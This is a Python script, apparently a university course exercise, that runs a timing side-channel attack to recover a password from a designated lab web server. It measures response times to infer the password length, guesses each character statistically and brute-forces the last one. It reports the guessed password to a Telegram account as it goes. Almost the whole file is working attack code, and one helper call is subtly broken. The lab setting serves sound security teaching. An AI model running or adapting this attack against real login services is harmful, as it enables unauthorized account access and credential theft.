from __future__ import print_function
import requests
import string
import time
import operator
import sys
from numpy import median, quantile
import telegram_send

# Our GitHub repo:
# https://github.com/chendoy/temporal-side-channel-aoi

# ███╗   ███╗██╗██╗     ███████╗███████╗████████╗ ██████╗ ███╗   ██╗███████╗    ██████╗ 
# ████╗ ████║██║██║     ██╔════╝██╔════╝╚══██╔══╝██╔═══██╗████╗  ██║██╔════╝    ╚════██╗
# ██╔████╔██║██║██║     █████╗  ███████╗   ██║   ██║   ██║██╔██╗ ██║█████╗       █████╔╝
# ██║╚██╔╝██║██║██║     ██╔══╝  ╚════██║   ██║   ██║   ██║██║╚██╗██║██╔══╝      ██╔═══╝ 
# ██║ ╚═╝ ██║██║███████╗███████╗███████║   ██║   ╚██████╔╝██║ ╚████║███████╗    ███████╗
# ╚═╝     ╚═╝╚═╝╚══════╝╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚══════╝
																					  
# ==================================== configuration =====================================

URL = 'http://aoi.ise.bgu.ac.il/'
ALL_CHARS = string.ascii_lowercase
NUM_ROUNDS_LENGTH_GUESS = 16
NUM_ROUNDS_CHARS_GUESS = 11
MAX_PASSWD_LENGTH = 32
NUM_CHANCES = 4 # Lives per character
TIMEOUT = 20 # In seconds
RETRY_LIMIT = 10
FILT_THRESH = 0.2 # What quntile of lowest measurements to remove before next measurement

# ========================================================================================

def timing_attack(params):
	"""
	The main function of the attack. Runs the pipeling:
	wake-up calls --> length infering --> character guessing --> validate

	This functions prints informative messages to stderr, and only the final
	password to stdout, as requested. If this function fails to guess to correct
	password, it starts-over and trying again.

		Parameters:
			params (dictionary) -- a python dictionary with the query strings parameters.

		This function does not return anyhting, only prints to stderr and stdout.
	"""
	eprint('Sending wakeup requests...')
	wakeup_server()
	eprint('Getting password length...')
	passwd_length = get_passwd_length(params)
	eprint('Password length is', passwd_length)
	curr_passwd = '*' * passwd_length
	telegram_send.send(messages=[f'password: {curr_passwd}'])
	for i in range(passwd_length-1): # -1 beacuse we brute-force last character
		eprint('----------------------------------')
		eprint('Current password:', curr_passwd)
		params['password'] = curr_passwd
		eprint(f'Guessing character at index {i}')
		next_char = infer_ith_char(params, i)
		eprint(f'Best guess for index {i}:', next_char)
		curr_passwd = curr_passwd[:i] + next_char + curr_passwd[i+1:]
		telegram_send.send(messages=[f'password: {curr_passwd}'])
	eprint('----------------------------------')
	eprint('Current password:', curr_passwd)
	eprint('Brute-forcing last character...')
	last_char = brute_force_last(params, curr_passwd)
	eprint(f'Best guess for character at index {passwd_length-1}:', last_char)
	curr_passwd = curr_passwd[:-1] + last_char
	eprint('----------------------------------')
	if last_char != '*':
		print(curr_passwd)
		telegram_send.send(messages=[f'finished: {curr_passwd}'])
	else: # Don't worry, try again
		print('Starting over...')
		telegram_send.send(messages=['starting over...'])
		timing_attack(params)

def get_session():
	"""
	We've read somewhere that using a Session insted of sending
	individual request is better.
	"""

	session = requests.Session()
	adapter = requests.adapters.HTTPAdapter(
		pool_connections=100,
		pool_maxsize=100)
	session.mount('http://', adapter)
	return session


def get_passwd_length(params):
	"""
	Getting the correct password length by measuring different lengths
	and then taking the measurement with the highest median. This is due to
	length checking the server initially does, as in slide 8 of lecture 2.

		Parameters:
			params (dictionary) -- a python dictionary with the query strings parameters.

		Returns:
			passwd_length (int) -- the (probably) correct password length.
	"""

	length2time = {length: [] for length in range(1,MAX_PASSWD_LENGTH + 1)}
	for length in range(1, MAX_PASSWD_LENGTH + 1):
		passwd = 'a' * length
		params['password'] = passwd
		for i in range(NUM_ROUNDS_LENGTH_GUESS):
			rtt, _ = send_request(params)
			length2time[length].append(rtt)
		length2time[length] = median(length2time[length]) # Replace every list with its median

	passwd_length = max(length2time.items(), key=operator.itemgetter(1))[0] # Key with max value

	return passwd_length

def brute_force_last(params, passwd):
	"""
	Last character of the password can be search in exhaustive search manner (i.e brute-force)
	instead of by the side channel, because this is faster.

		Parameters:
			params (dictionary) -- a python dictionary with the query strings parameters.

		Returns:
			next_char (char) -- the last character, the one that gives us '1' response from the server.
		
		Note: this function returns '*' when failing to find the correct password. It leads to starting
		over in the main function of this script.
	"""

	for next_char in ALL_CHARS:
		params['password'] = passwd[:-1] + next_char
		_, res = send_request(params)
		if res == '1':
			return next_char
	return '*' # Probably an error


def get_rtts(params, i, char2AccRtt):
	"""
	This functions performs a single measurement of all the character currently under consideration.
	Basicly, it refreshes the char2AccRtt dictionary with new measurements from the server.

		Parameters:
			params (dictionary) -- a python dictionary with the query strings parameters.
			i (int) -- the index of the character we currently guessing.
			char2AccRtt (python dictionary) -- the character to times dictionary we are refreshing.

		Returns:
			char2AccRtt (python dictionary) -- the updated character to times dictionary.
	"""
	passwd = params['password']
	for char in char2AccRtt.keys():
		new_passwd = passwd[:i] + char + passwd[i+1:]
		params['password'] = new_passwd
		measurements = []
		for _ in range(NUM_ROUNDS_CHARS_GUESS):
			rtt, _ = send_request(params) # Discard the response in the output
			measurements.append(rtt)
		char2AccRtt[char] = (char2AccRtt[char][0] + median(measurements), char2AccRtt[char][1])
	return char2AccRtt


def send_request(params, limit=RETRY_LIMIT):
	"""
	Wrapper function for sending http requests to the server.
	This function handles exceptions, timeouts, network errors, etc.

		Parameters:
			params (dictionary) -- a python dictionary with the query strings parameters.
			limit (int) -- number of repeating attempts before exiting (default RETRY_LIMIT, see 'configuration' up top).

		Returns:
			elapsed (int) -- amount of time to get the response (in seconds).
			success (str) -- '0' for incorrect password, '1' otherwise (server response).
	"""
	
	if limit == 0:
		eprint(f'Failed to get response for {RETRY_LIMIT} times, exiting...')
		exit(1)
	try:
		res = session.get(URL, params=params, timeout=TIMEOUT)
	except requests.exceptions.Timeout:
		eprint('Timeout limit exceeded, re-trying...')
		return send_request(params, limit-1)
	except requests.exceptions.ConnectionError:
		eprint('Connection error occurred, re-trying...')
		return send_request(params, limit-1)
	elapsed = res.elapsed.total_seconds()
	success = res.text
	return elapsed, success


def infer_ith_char(params, i):
	"""
	Infer the i'th character of the password through the side channel.

		Parameters:
			params (dictionary) -- a python dictionary with the query strings parameters.

		Returns:
			best_guess (string) -- the character which is most probable to be the next one.
	"""
	char2AccRtt = {char: (0, NUM_CHANCES) for char in ALL_CHARS} # {character: (acc_time, lives)} e.g. {'a': (4.56, 3)}
	while len(char2AccRtt) > 1:
		char2AccRtt = get_rtts(params, i, char2AccRtt)
		times = [v[0] for v in char2AccRtt.values()]
		thresh = quantile(times, FILT_THRESH)
		char2AccRtt = disqualify_characters(char2AccRtt, thresh)
	
	best_guess = list(char2AccRtt.keys()).pop()
	return best_guess

def disqualify_characters(char2AccRtt, thresh):
	"""
	This function "diaqualifies" the lowest characthers in the measurment.
	By "diaqualify" we mean deceasing its lives count by one, then removing characters with zero lives.

		Parameters:
			char2AccRtt (python dictionary) -- the character to times dictionary we are handling.
			thresh (float) -- the thereshold we use to remove characters with times bellow it.

		Returns:
			char2AccRtt (python dictionary) -- the updated character to times dictionary (after removals).
	"""

	for char, (time, lives) in char2AccRtt.items():
		if time < thresh:
			char2AccRtt[char] = (time, lives - 1)
	char2AccRtt = {char:(time, lives) for char,(time, lives) in char2AccRtt.items() if lives > 0} # Remove chars with 0 "lives"
	return char2AccRtt

def wakeup_server():
	"""
	Sends tome inital wake-up calls to the server, so the session will save the
	three-way-handshake.
	"""
	_, _ = send_request('bruce wayne', '42')


def eprint(*args, **kwargs):
	"""
	Prints to stderr, for more informative messages.
	"""
	print(*args, file=sys.stderr, **kwargs)


if __name__ == '__main__':
	global session
	session = get_session()
	if len(sys.argv) != 3:
		eprint('Usage: python3 ex01_M2.py <username> <difficulty>')
		exit(1)
	params = {'user': sys.argv[1], 'difficulty': sys.argv[2]}
	telegram_send.send(messages=[f'{sys.argv[1]}: difficulty {sys.argv[2]}'])
	start = time.time()
	timing_attack(params)
	end = time.time()
	eprint(f'Finished in {(end-start)/60:.2f} minutes')